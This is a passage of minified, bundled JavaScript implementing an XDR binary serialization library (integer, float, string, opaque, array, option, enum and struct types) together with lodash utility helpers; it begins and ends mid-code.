    function b(K) {
        return K && K.__esModule ? K : {
            default: K
        }
    }
    function X(K, Q) {
        if (!(K instanceof Q))
            throw new TypeError("Cannot call a class as a function")
    }
    function Y(K, Q) {
        if (!K)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return Q && (typeof Q == "object" || typeof Q == "function") ? Q : K
    }
    function F(K, Q) {
        if (typeof Q != "function" && Q !== null)
            throw new TypeError("Super expression must either be null or a function, not " + typeof Q);
        K.prototype = Object.create(Q && Q.prototype, {
            constructor: {
                value: K,
                enumerable: !1,
                writable: !0,
                configurable: !0
            }
        }),
        Q && (Object.setPrototypeOf ? Object.setPrototypeOf(K, Q) : K.__proto__ = Q)
    }
    var V = unsignedHyper.UnsignedHyper = function(K) {
        F(Q, K),
        _(Q, null, [{
            key: "read",
            value: function(ae) {
                var ne = ae.readInt32BE()
                  , oe = ae.readInt32BE();
                return this.fromBits(oe, ne)
            }
        }, {
            key: "write",
            value: function(ae, ne) {
                if (!(ae instanceof this))
                    throw new Error("XDR Write Error: " + ae + " is not an UnsignedHyper");
                ne.writeInt32BE(ae.high),
                ne.writeInt32BE(ae.low)
            }
        }, {
            key: "fromString",
            value: function(ae) {
                if (!/^\d+$/.test(ae))
                    throw new Error("Invalid hyper string: " + ae);
                var ne = M(Q.__proto__ || Object.getPrototypeOf(Q), "fromString", this).call(this, ae, !0);
                return new this(ne.low,ne.high)
            }
        }, {
            key: "fromBits",
            value: function(ae, ne) {
                var oe = M(Q.__proto__ || Object.getPrototypeOf(Q), "fromBits", this).call(this, ae, ne, !0);
                return new this(oe.low,oe.high)
            }
        }, {
            key: "isValid",
            value: function(ae) {
                return ae instanceof this
            }
        }]);
        function Q(ee, ae) {
            return X(this, Q),
            Y(this, (Q.__proto__ || Object.getPrototypeOf(Q)).call(this, ee, ae, !0))
        }
        return Q
    }(O.default);
    return (0,
    w.default)(V),
    V.MAX_VALUE = new V(O.default.MAX_UNSIGNED_VALUE.low,O.default.MAX_UNSIGNED_VALUE.high),
    V.MIN_VALUE = new V(O.default.MIN_VALUE.low,O.default.MIN_VALUE.high),
    unsignedHyper
}
var float = {}, hasRequiredFloat;
function requireFloat() {
    if (hasRequiredFloat)
        return float;
    hasRequiredFloat = 1,
    Object.defineProperty(float, "__esModule", {
        value: !0
    }),
    float.Float = void 0;
    var _ = requireIsNumber()
      , M = x(_)
      , j = requireIoMixin()
      , O = x(j);
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    var w = float.Float = {
        read: function(X) {
            return X.readFloatBE()
        },
        write: function(X, Y) {
            if (!(0,
            M.default)(X))
                throw new Error("XDR Write Error: not a number");
            Y.writeFloatBE(X)
        },
        isValid: function(X) {
            return (0,
            M.default)(X)
        }
    };
    return (0,
    O.default)(w),
    float
}
var double = {}, hasRequiredDouble;
function requireDouble() {
    if (hasRequiredDouble)
        return double;
    hasRequiredDouble = 1,
    Object.defineProperty(double, "__esModule", {
        value: !0
    }),
    double.Double = void 0;
    var _ = requireIsNumber()
      , M = x(_)
      , j = requireIoMixin()
      , O = x(j);
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    var w = double.Double = {
        read: function(X) {
            return X.readDoubleBE()
        },
        write: function(X, Y) {
            if (!(0,
            M.default)(X))
                throw new Error("XDR Write Error: not a number");
            Y.writeDoubleBE(X)
        },
        isValid: function(X) {
            return (0,
            M.default)(X)
        }
    };
    return (0,
    O.default)(w),
    double
}
var quadruple = {}, hasRequiredQuadruple;
function requireQuadruple() {
    if (hasRequiredQuadruple)
        return quadruple;
    hasRequiredQuadruple = 1,
    Object.defineProperty(quadruple, "__esModule", {
        value: !0
    }),
    quadruple.Quadruple = void 0;
    var _ = requireIoMixin()
      , M = j(_);
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    var O = quadruple.Quadruple = {
        read: function() {
            throw new Error("XDR Read Error: quadruple not supported")
        },
        write: function() {
            throw new Error("XDR Write Error: quadruple not supported")
        },
        isValid: function() {
            return !1
        }
    };
    return (0,
    M.default)(O),
    quadruple
}
var bool = {}, isBoolean_1, hasRequiredIsBoolean;
function requireIsBoolean() {
    if (hasRequiredIsBoolean)
        return isBoolean_1;
    hasRequiredIsBoolean = 1;
    var _ = require_baseGetTag()
      , M = requireIsObjectLike()
      , j = "[object Boolean]";
    function O(x) {
        return x === !0 || x === !1 || M(x) && _(x) == j
    }
    return isBoolean_1 = O,
    isBoolean_1
}
var hasRequiredBool;
function requireBool() {
    if (hasRequiredBool)
        return bool;
    hasRequiredBool = 1,
    Object.defineProperty(bool, "__esModule", {
        value: !0
    }),
    bool.Bool = void 0;
    var _ = requireIsBoolean()
      , M = w(_)
      , j = requireInt()
      , O = requireIoMixin()
      , x = w(O);
    function w(X) {
        return X && X.__esModule ? X : {
            default: X
        }
    }
    var b = bool.Bool = {
        read: function(Y) {
            var F = j.Int.read(Y);
            switch (F) {
            case 0:
                return !1;
            case 1:
                return !0;
            default:
                throw new Error("XDR Read Error: Got " + F + " when trying to read a bool")
            }
        },
        write: function(Y, F) {
            var V = Y ? 1 : 0;
            return j.Int.write(V, F)
        },
        isValid: function(Y) {
            return (0,
            M.default)(Y)
        }
    };
    return (0,
    x.default)(b),
    bool
}
var string = {}, isString_1, hasRequiredIsString;
function requireIsString() {
    if (hasRequiredIsString)
        return isString_1;
    hasRequiredIsString = 1;
    var _ = require_baseGetTag()
      , M = requireIsArray()
      , j = requireIsObjectLike()
      , O = "[object String]";
    function x(w) {
        return typeof w == "string" || !M(w) && j(w) && _(w) == O
    }
    return isString_1 = x,
    isString_1
}
var hasRequiredString;
function requireString() {
    if (hasRequiredString)
        return string;
    hasRequiredString = 1,
    Object.defineProperty(string, "__esModule", {
        value: !0
    }),
    string.String = void 0;
    var _ = function() {
        function ee(ae, ne) {
            for (var oe = 0; oe < ne.length; oe++) {
                var ue = ne[oe];
                ue.enumerable = ue.enumerable || !1,
                ue.configurable = !0,
                "value"in ue && (ue.writable = !0),
                Object.defineProperty(ae, ue.key, ue)
            }
        }
        return function(ae, ne, oe) {
            return ne && ee(ae.prototype, ne),
            oe && ee(ae, oe),
            ae
        }
    }()
      , M = requireIsString()
      , j = V(M)
      , O = requireIsArray()
      , x = V(O)
      , w = requireInt()
      , b = requireUnsignedInt()
      , X = requireUtil$1()
      , Y = requireIoMixin()
      , F = V(Y);
    function V(ee) {
        return ee && ee.__esModule ? ee : {
            default: ee
        }
    }
    function K(ee, ae) {
        if (!(ee instanceof ae))
            throw new TypeError("Cannot call a class as a function")
    }
    var Q = string.String = function() {
        function ee() {
            var ae = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : b.UnsignedInt.MAX_VALUE;
            K(this, ee),
            this._maxLength = ae
        }
        return _(ee, [{
            key: "read",
            value: function(ne) {
                var oe = w.Int.read(ne);
                if (oe > this._maxLength)
                    throw new Error("XDR Read Error: Saw " + oe + " length String," + ("max allowed is " + this._maxLength));
                var ue = (0,
                X.calculatePadding)(oe)
                  , fe = ne.slice(oe);
                return (0,
                X.slicePadding)(ne, ue),
                fe.buffer()
            }
        }, {
            key: "readString",
            value: function(ne) {
                return this.read(ne).toString("utf8")
            }
        }, {
            key: "write",
            value: function(ne, oe) {
                if (ne.length > this._maxLength)
                    throw new Error("XDR Write Error: Got " + ne.length + " bytes," + ("max allows is " + this._maxLength));
                var ue = void 0;
                (0,
                j.default)(ne) ? ue = Buffer.from(ne, "utf8") : ue = Buffer.from(ne),
                w.Int.write(ue.length, oe),
                oe.writeBufferPadded(ue)
            }
        }, {
            key: "isValid",
            value: function(ne) {
                var oe = void 0;
                if ((0,
                j.default)(ne))
                    oe = Buffer.from(ne, "utf8");
                else if ((0,
                x.default)(ne) || Buffer.isBuffer(ne))
                    oe = Buffer.from(ne);
                else
                    return !1;
                return oe.length <= this._maxLength
            }
        }]),
        ee
    }();
    return (0,
    F.default)(Q.prototype),
    string
}
var opaque = {}, hasRequiredOpaque;
function requireOpaque() {
    if (hasRequiredOpaque)
        return opaque;
    hasRequiredOpaque = 1,
    Object.defineProperty(opaque, "__esModule", {
        value: !0
    }),
    opaque.Opaque = void 0;
    var _ = function() {
        function X(Y, F) {
            for (var V = 0; V < F.length; V++) {
                var K = F[V];
                K.enumerable = K.enumerable || !1,
                K.configurable = !0,
                "value"in K && (K.writable = !0),
                Object.defineProperty(Y, K.key, K)
            }
        }
        return function(Y, F, V) {
            return F && X(Y.prototype, F),
            V && X(Y, V),
            Y
        }
    }()
      , M = requireUtil$1()
      , j = requireIoMixin()
      , O = x(j);
    function x(X) {
        return X && X.__esModule ? X : {
            default: X
        }
    }
    function w(X, Y) {
        if (!(X instanceof Y))
            throw new TypeError("Cannot call a class as a function")
    }
    var b = opaque.Opaque = function() {
        function X(Y) {
            w(this, X),
            this._length = Y,
            this._padding = (0,
            M.calculatePadding)(Y)
        }
        return _(X, [{
            key: "read",
            value: function(F) {
                var V = F.slice(this._length);
                return (0,
                M.slicePadding)(F, this._padding),
                V.buffer()
            }
        }, {
            key: "write",
            value: function(F, V) {
                if (F.length !== this._length)
                    throw new Error("XDR Write Error: Got " + F.length + " bytes, expected " + this._length);
                V.writeBufferPadded(F)
            }
        }, {
            key: "isValid",
            value: function(F) {
                return Buffer.isBuffer(F) && F.length === this._length
            }
        }]),
        X
    }();
    return (0,
    O.default)(b.prototype),
    opaque
}
var varOpaque = {}, hasRequiredVarOpaque;
function requireVarOpaque() {
    if (hasRequiredVarOpaque)
        return varOpaque;
    hasRequiredVarOpaque = 1,
    Object.defineProperty(varOpaque, "__esModule", {
        value: !0
    }),
    varOpaque.VarOpaque = void 0;
    var _ = function() {
        function F(V, K) {
            for (var Q = 0; Q < K.length; Q++) {
                var ee = K[Q];
                ee.enumerable = ee.enumerable || !1,
                ee.configurable = !0,
                "value"in ee && (ee.writable = !0),
                Object.defineProperty(V, ee.key, ee)
            }
        }
        return function(V, K, Q) {
            return K && F(V.prototype, K),
            Q && F(V, Q),
            V
        }
    }()
      , M = requireInt()
      , j = requireUnsignedInt()
      , O = requireUtil$1()
      , x = requireIoMixin()
      , w = b(x);
    function b(F) {
        return F && F.__esModule ? F : {
            default: F
        }
    }
    function X(F, V) {
        if (!(F instanceof V))
            throw new TypeError("Cannot call a class as a function")
    }
    var Y = varOpaque.VarOpaque = function() {
        function F() {
            var V = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : j.UnsignedInt.MAX_VALUE;
            X(this, F),
            this._maxLength = V
        }
        return _(F, [{
            key: "read",
            value: function(K) {
                var Q = M.Int.read(K);
                if (Q > this._maxLength)
                    throw new Error("XDR Read Error: Saw " + Q + " length VarOpaque," + ("max allowed is " + this._maxLength));
                var ee = (0,
                O.calculatePadding)(Q)
                  , ae = K.slice(Q);
                return (0,
                O.slicePadding)(K, ee),
                ae.buffer()
            }
        }, {
            key: "write",
            value: function(K, Q) {
                if (K.length > this._maxLength)
                    throw new Error("XDR Write Error: Got " + K.length + " bytes," + ("max allows is " + this._maxLength));
                M.Int.write(K.length, Q),
                Q.writeBufferPadded(K)
            }
        }, {
            key: "isValid",
            value: function(K) {
                return Buffer.isBuffer(K) && K.length <= this._maxLength
            }
        }]),
        F
    }();
    return (0,
    w.default)(Y.prototype),
    varOpaque
}
var array = {}, _arrayEach, hasRequired_arrayEach;
function require_arrayEach() {
    if (hasRequired_arrayEach)
        return _arrayEach;
    hasRequired_arrayEach = 1;
    function _(M, j) {
        for (var O = -1, x = M == null ? 0 : M.length; ++O < x && j(M[O], O, M) !== !1; )
            ;
        return M
    }
    return _arrayEach = _,
    _arrayEach
}
var forEach_1, hasRequiredForEach;
function requireForEach() {
    if (hasRequiredForEach)
        return forEach_1;
    hasRequiredForEach = 1;
    var _ = require_arrayEach()
      , M = require_baseEach()
      , j = require_castFunction()
      , O = requireIsArray();
    function x(w, b) {
        var X = O(w) ? _ : M;
        return X(w, j(b))
    }
    return forEach_1 = x,
    forEach_1
}
var each, hasRequiredEach;
function requireEach() {
    return hasRequiredEach || (hasRequiredEach = 1,
    each = requireForEach()),
    each
}
var _trimmedEndIndex, hasRequired_trimmedEndIndex;
function require_trimmedEndIndex() {
    if (hasRequired_trimmedEndIndex)
        return _trimmedEndIndex;
    hasRequired_trimmedEndIndex = 1;
    var _ = /\s/;
    function M(j) {
        for (var O = j.length; O-- && _.test(j.charAt(O)); )
            ;
        return O
    }
    return _trimmedEndIndex = M,
    _trimmedEndIndex
}
var _baseTrim, hasRequired_baseTrim;
function require_baseTrim() {
    if (hasRequired_baseTrim)
        return _baseTrim;
    hasRequired_baseTrim = 1;
    var _ = require_trimmedEndIndex()
      , M = /^\s+/;
    function j(O) {
        return O && O.slice(0, _(O) + 1).replace(M, "")
    }
    return _baseTrim = j,
    _baseTrim
}
var toNumber_1, hasRequiredToNumber;
function requireToNumber() {
    if (hasRequiredToNumber)
        return toNumber_1;
    hasRequiredToNumber = 1;
    var _ = require_baseTrim()
      , M = requireIsObject()
      , j = requireIsSymbol()
      , O = NaN
      , x = /^[-+]0x[0-9a-f]+$/i
      , w = /^0b[01]+$/i
      , b = /^0o[0-7]+$/i
      , X = parseInt;
    function Y(F) {
        if (typeof F == "number")
            return F;
        if (j(F))
            return O;
        if (M(F)) {
            var V = typeof F.valueOf == "function" ? F.valueOf() : F;
            F = M(V) ? V + "" : V
        }
        if (typeof F != "string")
            return F === 0 ? F : +F;
        F = _(F);
        var K = w.test(F);
        return K || b.test(F) ? X(F.slice(2), K ? 2 : 8) : x.test(F) ? O : +F
    }
    return toNumber_1 = Y,
    toNumber_1
}
var toFinite_1, hasRequiredToFinite;
function requireToFinite() {
    if (hasRequiredToFinite)
        return toFinite_1;
    hasRequiredToFinite = 1;
    var _ = requireToNumber()
      , M = 1 / 0
      , j = 17976931348623157e292;
    function O(x) {
        if (!x)
            return x === 0 ? x : 0;
        if (x = _(x),
        x === M || x === -1 / 0) {
            var w = x < 0 ? -1 : 1;
            return w * j
        }
        return x === x ? x : 0
    }
    return toFinite_1 = O,
    toFinite_1
}
var toInteger_1, hasRequiredToInteger;
function requireToInteger() {
    if (hasRequiredToInteger)
        return toInteger_1;
    hasRequiredToInteger = 1;
    var _ = requireToFinite();
    function M(j) {
        var O = _(j)
          , x = O % 1;
        return O === O ? x ? O - x : O : 0
    }
    return toInteger_1 = M,
    toInteger_1
}
var times_1, hasRequiredTimes;
function requireTimes() {
    if (hasRequiredTimes)
        return times_1;
    hasRequiredTimes = 1;
    var _ = require_baseTimes()
      , M = require_castFunction()
      , j = requireToInteger()
      , O = 9007199254740991
      , x = 4294967295
      , w = Math.min;
    function b(X, Y) {
        if (X = j(X),
        X < 1 || X > O)
            return [];
        var F = x
          , V = w(X, x);
        Y = M(Y),
        X -= x;
        for (var K = _(V, Y); ++F < X; )
            Y(F);
        return K
    }
    return times_1 = b,
    times_1
}
var hasRequiredArray;
function requireArray() {
    if (hasRequiredArray)
        return array;
    hasRequiredArray = 1,
    Object.defineProperty(array, "__esModule", {
        value: !0
    }),
    array.Array = void 0;
    var _ = function() {
        function ae(ne, oe) {
            for (var ue = 0; ue < oe.length; ue++) {
                var fe = oe[ue];
                fe.enumerable = fe.enumerable || !1,
                fe.configurable = !0,
                "value"in fe && (fe.writable = !0),
                Object.defineProperty(ne, fe.key, fe)
            }
        }
        return function(ne, oe, ue) {
            return oe && ae(ne.prototype, oe),
            ue && ae(ne, ue),
            ne
        }
    }()
      , M = requireEvery()
      , j = K(M)
      , O = requireEach()
      , x = K(O)
      , w = requireTimes()
      , b = K(w)
      , X = requireIsArray()
      , Y = K(X)
      , F = requireIoMixin()
      , V = K(F);
    function K(ae) {
        return ae && ae.__esModule ? ae : {
            default: ae
        }
    }
    function Q(ae, ne) {
        if (!(ae instanceof ne))
            throw new TypeError("Cannot call a class as a function")
    }
    var ee = array.Array = function() {
        function ae(ne, oe) {
            Q(this, ae),
            this._childType = ne,
            this._length = oe
        }
        return _(ae, [{
            key: "read",
            value: function(oe) {
                var ue = this;
                return (0,
                b.default)(this._length, function() {
                    return ue._childType.read(oe)
                })
            }
        }, {
            key: "write",
            value: function(oe, ue) {
                var fe = this;
                if (!(0,
                Y.default)(oe))
                    throw new Error("XDR Write Error: value is not array");
                if (oe.length !== this._length)
                    throw new Error("XDR Write Error: Got array of size " + oe.length + "," + ("expected " + this._length));
                (0,
                x.default)(oe, function(he) {
                    return fe._childType.write(he, ue)
                })
            }
        }, {
            key: "isValid",
            value: function(oe) {
                var ue = this;
                return !(0,
                Y.default)(oe) || oe.length !== this._length ? !1 : (0,
                j.default)(oe, function(fe) {
                    return ue._childType.isValid(fe)
                })
            }
        }]),
        ae
    }();
    return (0,
    V.default)(ee.prototype),
    array
}
var varArray = {}, hasRequiredVarArray;
function requireVarArray() {
    if (hasRequiredVarArray)
        return varArray;
    hasRequiredVarArray = 1,
    Object.defineProperty(varArray, "__esModule", {
        value: !0
    }),
    varArray.VarArray = void 0;
    var _ = function() {
        function oe(ue, fe) {
            for (var he = 0; he < fe.length; he++) {
                var pe = fe[he];
                pe.enumerable = pe.enumerable || !1,
                pe.configurable = !0,
                "value"in pe && (pe.writable = !0),
                Object.defineProperty(ue, pe.key, pe)
            }
        }
        return function(ue, fe, he) {
            return fe && oe(ue.prototype, fe),
            he && oe(ue, he),
            ue
        }
    }()
      , M = requireEvery()
      , j = ee(M)
      , O = requireEach()
      , x = ee(O)
      , w = requireTimes()
      , b = ee(w)
      , X = requireIsArray()
      , Y = ee(X)
      , F = requireUnsignedInt()
      , V = requireInt()
      , K = requireIoMixin()
      , Q = ee(K);
    function ee(oe) {
        return oe && oe.__esModule ? oe : {
            default: oe
        }
    }
    function ae(oe, ue) {
        if (!(oe instanceof ue))
            throw new TypeError("Cannot call a class as a function")
    }
    var ne = varArray.VarArray = function() {
        function oe(ue) {
            var fe = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : F.UnsignedInt.MAX_VALUE;
            ae(this, oe),
            this._childType = ue,
            this._maxLength = fe
        }
        return _(oe, [{
            key: "read",
            value: function(fe) {
                var he = this
                  , pe = V.Int.read(fe);
                if (pe > this._maxLength)
                    throw new Error("XDR Read Error: Saw " + pe + " length VarArray," + ("max allowed is " + this._maxLength));
                return (0,
                b.default)(pe, function() {
                    return he._childType.read(fe)
                })
            }
        }, {
            key: "write",
            value: function(fe, he) {
                var pe = this;
                if (!(0,
                Y.default)(fe))
                    throw new Error("XDR Write Error: value is not array");
                if (fe.length > this._maxLength)
                    throw new Error("XDR Write Error: Got array of size " + fe.length + "," + ("max allowed is " + this._maxLength));
                V.Int.write(fe.length, he),
                (0,
                x.default)(fe, function(ye) {
                    return pe._childType.write(ye, he)
                })
            }
        }, {
            key: "isValid",
            value: function(fe) {
                var he = this;
                return !(0,
                Y.default)(fe) || fe.length > this._maxLength ? !1 : (0,
                j.default)(fe, function(pe) {
                    return he._childType.isValid(pe)
                })
            }
        }]),
        oe
    }();
    return (0,
    Q.default)(ne.prototype),
    varArray
}
var option = {}, isNull_1, hasRequiredIsNull;
function requireIsNull() {
    if (hasRequiredIsNull)
        return isNull_1;
    hasRequiredIsNull = 1;
    function _(M) {
        return M === null
    }
    return isNull_1 = _,
    isNull_1
}
var isUndefined_1, hasRequiredIsUndefined;
function requireIsUndefined() {
    if (hasRequiredIsUndefined)
        return isUndefined_1;
    hasRequiredIsUndefined = 1;
    function _(M) {
        return M === void 0
    }
    return isUndefined_1 = _,
    isUndefined_1
}
var hasRequiredOption;
function requireOption() {
    if (hasRequiredOption)
        return option;
    hasRequiredOption = 1,
    Object.defineProperty(option, "__esModule", {
        value: !0
    }),
    option.Option = void 0;
    var _ = function() {
        function K(Q, ee) {
            for (var ae = 0; ae < ee.length; ae++) {
                var ne = ee[ae];
                ne.enumerable = ne.enumerable || !1,
                ne.configurable = !0,
                "value"in ne && (ne.writable = !0),
                Object.defineProperty(Q, ne.key, ne)
            }
        }
        return function(Q, ee, ae) {
            return ee && K(Q.prototype, ee),
            ae && K(Q, ae),
            Q
        }
    }()
      , M = requireIsNull()
      , j = Y(M)
      , O = requireIsUndefined()
      , x = Y(O)
      , w = requireBool()
      , b = requireIoMixin()
      , X = Y(b);
    function Y(K) {
        return K && K.__esModule ? K : {
            default: K
        }
    }
    function F(K, Q) {
        if (!(K instanceof Q))
            throw new TypeError("Cannot call a class as a function")
    }
    var V = option.Option = function() {
        function K(Q) {
            F(this, K),
            this._childType = Q
        }
        return _(K, [{
            key: "read",
            value: function(ee) {
                if (w.Bool.read(ee))
                    return this._childType.read(ee)
            }
        }, {
            key: "write",
            value: function(ee, ae) {
                var ne = !((0,
                j.default)(ee) || (0,
                x.default)(ee));
                w.Bool.write(ne, ae),
                ne && this._childType.write(ee, ae)
            }
        }, {
            key: "isValid",
            value: function(ee) {
                return (0,
                j.default)(ee) || (0,
                x.default)(ee) ? !0 : this._childType.isValid(ee)
            }
        }]),
        K
    }();
    return (0,
    X.default)(V.prototype),
    option
}
var _void = {}, hasRequired_void;
function require_void() {
    if (hasRequired_void)
        return _void;
    hasRequired_void = 1,
    Object.defineProperty(_void, "__esModule", {
        value: !0
    }),
    _void.Void = void 0;
    var _ = requireIsUndefined()
      , M = x(_)
      , j = requireIoMixin()
      , O = x(j);
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    var w = _void.Void = {
        read: function() {},
        write: function(X) {
            if (!(0,
            M.default)(X))
                throw new Error("XDR Write Error: trying to write value to a void slot")
        },
        isValid: function(X) {
            return (0,
            M.default)(X)
        }
    };
    return (0,
    O.default)(w),
    _void
}
var _enum = {}, _baseValues, hasRequired_baseValues;
function require_baseValues() {
    if (hasRequired_baseValues)
        return _baseValues;
    hasRequired_baseValues = 1;
    var _ = require_arrayMap();
    function M(j, O) {
        return _(O, function(x) {
            return j[x]
        })
    }
    return _baseValues = M,
    _baseValues
}
var values_1, hasRequiredValues;
function requireValues() {
    if (hasRequiredValues)
        return values_1;
    hasRequiredValues = 1;
    var _ = require_baseValues()
      , M = requireKeys();
    function j(O) {
        return O == null ? [] : _(O, M(O))
    }
    return values_1 = j,
    values_1
}
var hasRequired_enum;
function require_enum() {
    if (hasRequired_enum)
        return _enum;
    hasRequired_enum = 1,
    Object.defineProperty(_enum, "__esModule", {
        value: !0
    }),
    _enum.Enum = void 0;
    var _ = function() {
        function ee(ae, ne) {
            for (var oe = 0; oe < ne.length; oe++) {
                var ue = ne[oe];
                ue.enumerable = ue.enumerable || !1,
                ue.configurable = !0,
                "value"in ue && (ue.writable = !0),
                Object.defineProperty(ae, ue.key, ue)
            }
        }
        return function(ae, ne, oe) {
            return ne && ee(ae.prototype, ne),
            oe && ee(ae, oe),
            ae
        }
    }()
      , M = requireEach()
      , j = Y(M)
      , O = requireValues()
      , x = Y(O)
      , w = requireInt()
      , b = requireIoMixin()
      , X = Y(b);
    function Y(ee) {
        return ee && ee.__esModule ? ee : {
            default: ee
        }
    }
    function F(ee, ae) {
        if (!ee)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return ae && (typeof ae == "object" || typeof ae == "function") ? ae : ee
    }
    function V(ee, ae) {
        if (typeof ae != "function" && ae !== null)
            throw new TypeError("Super expression must either be null or a function, not " + typeof ae);
        ee.prototype = Object.create(ae && ae.prototype, {
            constructor: {
                value: ee,
                enumerable: !1,
                writable: !0,
                configurable: !0
            }
        }),
        ae && (Object.setPrototypeOf ? Object.setPrototypeOf(ee, ae) : ee.__proto__ = ae)
    }
    function K(ee, ae) {
        if (!(ee instanceof ae))
            throw new TypeError("Cannot call a class as a function")
    }
    var Q = _enum.Enum = function() {
        function ee(ae, ne) {
            K(this, ee),
            this.name = ae,
            this.value = ne
        }
        return _(ee, null, [{
            key: "read",
            value: function(ne) {
                var oe = w.Int.read(ne);
                if (!this._byValue.has(oe))
                    throw new Error("XDR Read Error: Unknown " + this.enumName + " member for value " + oe);
                return this._byValue.get(oe)
            }
        }, {
            key: "write",
            value: function(ne, oe) {
                if (!(ne instanceof this))
                    throw new Error("XDR Write Error: Unknown " + ne + " is not a " + this.enumName);
                w.Int.write(ne.value, oe)
            }
        }, {
            key: "isValid",
            value: function(ne) {
                return ne instanceof this
            }
        }, {
            key: "members",
            value: function() {
                return this._members
            }
        }, {
            key: "values",
            value: function() {
                return (0,
                x.default)(this._members)
            }
        }, {
            key: "fromName",
            value: function(ne) {
                var oe = this._members[ne];
                if (!oe)
                    throw new Error(ne + " is not a member of " + this.enumName);
                return oe
            }
        }, {
            key: "fromValue",
            value: function(ne) {
                var oe = this._byValue.get(ne);
                if (!oe)
                    throw new Error(ne + " is not a value of any member of " + this.enumName);
                return oe
            }
        }, {
            key: "create",
            value: function(ne, oe, ue) {
                var fe = function(he) {
                    V(pe, he);
                    function pe() {
                        return K(this, pe),
                        F(this, (pe.__proto__ || Object.getPrototypeOf(pe)).apply(this, arguments))
                    }
                    return pe
                }(ee);
                return fe.enumName = oe,
                ne.results[oe] = fe,
                fe._members = {},
                fe._byValue = new Map,
                (0,
                j.default)(ue, function(he, pe) {
                    var ye = new fe(pe,he);
                    fe._members[pe] = ye,
                    fe._byValue.set(he, ye),
                    fe[pe] = function() {
                        return ye
                    }
                }),
                fe
            }
        }]),
        ee
    }();
    return (0,
    X.default)(Q),
    _enum
}
var struct = {}, _baseMap, hasRequired_baseMap;
function require_baseMap() {
    if (hasRequired_baseMap)
        return _baseMap;
    hasRequired_baseMap = 1;
    var _ = require_baseEach()
      , M = requireIsArrayLike();
    function j(O, x) {
        var w = -1
          , b = M(O) ? Array(O.length) : [];
        return _(O, function(X, Y, F) {
            b[++w] = x(X, Y, F)
        }),
        b
    }
    return _baseMap = j,
    _baseMap
}
var map_1, hasRequiredMap;
function requireMap() {
    if (hasRequiredMap)
        return map_1;
    hasRequiredMap = 1;
    var _ = require_arrayMap()
      , M = require_baseIteratee()
      , j = require_baseMap()
      , O = requireIsArray();
    function x(w, b) {
        var X = O(w) ? _ : j;
        return X(w, M(b, 3))
    }
    return map_1 = x,
    map_1
}
var fromPairs_1, hasRequiredFromPairs;
function requireFromPairs() {
    if (hasRequiredFromPairs)
        return fromPairs_1;
    hasRequiredFromPairs = 1;
    function _(M) {
        for (var j = -1, O = M == null ? 0 : M.length, x = {}; ++j < O; ) {
            var w = M[j];
            x[w[0]] = w[1]
        }
        return x
    }
    return fromPairs_1 = _,
    fromPairs_1
}
var reference = {}, hasRequiredReference;
function requireReference() {
    if (hasRequiredReference)
        return reference;
    hasRequiredReference = 1,
    Object.defineProperty(reference, "__esModule", {
        value: !0
    });
    var _ = function() {
        function j(O, x) {
            for (var w = 0; w < x.length; w++) {
                var b = x[w];
                b.enumerable = b.enumerable || !1,
                b.configurable = !0,
                "value"in b && (b.writable = !0),
                Object.defineProperty(O, b.key, b)
            }
        }
        return function(O, x, w) {
            return x && j(O.prototype, x),
            w && j(O, w),
            O
        }
    }();
    function M(j, O) {
        if (!(j instanceof O))
            throw new TypeError("Cannot call a class as a function")
    }
    return reference.Reference = function() {
        function j() {
            M(this, j)
        }
        return _(j, [{
            key: "resolve",
            value: function() {
                throw new Error("implement resolve in child class")
            }
        }]),
        j
    }(),
    reference
}
var hasRequiredStruct;
function requireStruct() {
    if (hasRequiredStruct)
        return struct;
    hasRequiredStruct = 1,
    Object.defineProperty(struct, "__esModule", {
        value: !0
    }),
    struct.Struct = void 0;
    var _ = function() {
        function he(pe, ye) {
            var be = []
              , xe = !0
              , Ae = !1
              , Ee = void 0;
            try {
                for (var Be = pe[Symbol.iterator](), ce; !(xe = (ce = Be.next()).done) && (be.push(ce.value),
                !(ye && be.length === ye)); xe = !0)
                    ;
            } catch (q) {
                Ae = !0,
                Ee = q
            } finally {
                try {
                    !xe && Be.return && Be.return()
                } finally {
                    if (Ae)
                        throw Ee
                }
            }
            return be
        }
        return function(pe, ye) {
            if (Array.isArray(pe))
                return pe;
            if (Symbol.iterator in Object(pe))
                return he(pe, ye);
            throw new TypeError("Invalid attempt to destructure non-iterable instance")
        }
    }()
      , M = function() {
        function he(pe, ye) {
            for (var be = 0; be < ye.length; be++) {
                var xe = ye[be];
                xe.enumerable = xe.enumerable || !1,
                xe.configurable = !0,
                "value"in xe && (xe.writable = !0),
                Object.defineProperty(pe, xe.key, xe)
            }
        }
        return function(pe, ye, be) {
            return ye && he(pe.prototype, ye),
            be && he(pe, be),
            pe
        }
    }()
      , j = requireEach()
      , O = ee(j)
      , x = requireMap()
      , w = ee(x)
      , b = requireIsUndefined()
      , X = ee(b)
      , Y = requireFromPairs()
      , F = ee(Y)
      , V = requireReference()
      , K = requireIoMixin()
      , Q = ee(K);
    function ee(he) {
        return he && he.__esModule ? he : {
            default: he
        }
    }
    function ae(he, pe) {
        if (!he)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return pe && (typeof pe == "object" || typeof pe == "function") ? pe : he
    }
    function ne(he, pe) {
        if (typeof pe != "function" && pe !== null)
            throw new TypeError("Super expression must either be null or a function, not " + typeof pe);
        he.prototype = Object.create(pe && pe.prototype, {
            constructor: {
                value: he,
                enumerable: !1,
                writable: !0,
                configurable: !0
            }
        }),
        pe && (Object.setPrototypeOf ? Object.setPrototypeOf(he, pe) : he.__proto__ = pe)
    }
    function oe(he, pe) {
        if (!(he instanceof pe))
            throw new TypeError("Cannot call a class as a function")
    }
    var ue = struct.Struct = function() {
        function he(pe) {
            oe(this, he),
            this._attributes = pe || {}
        }
        return M(he, null, [{
            key: "read",
            value: function(ye) {
                var be = (0,
                w.default)(this._fields, function(xe) {
                    var Ae = _(xe, 2)
                      , Ee = Ae[0]
                      , Be = Ae[1]
                      , ce = Be.read(ye);
                    return [Ee, ce]
                });
                return new this((0,
                F.default)(be))
            }
        }, {
            key: "write",
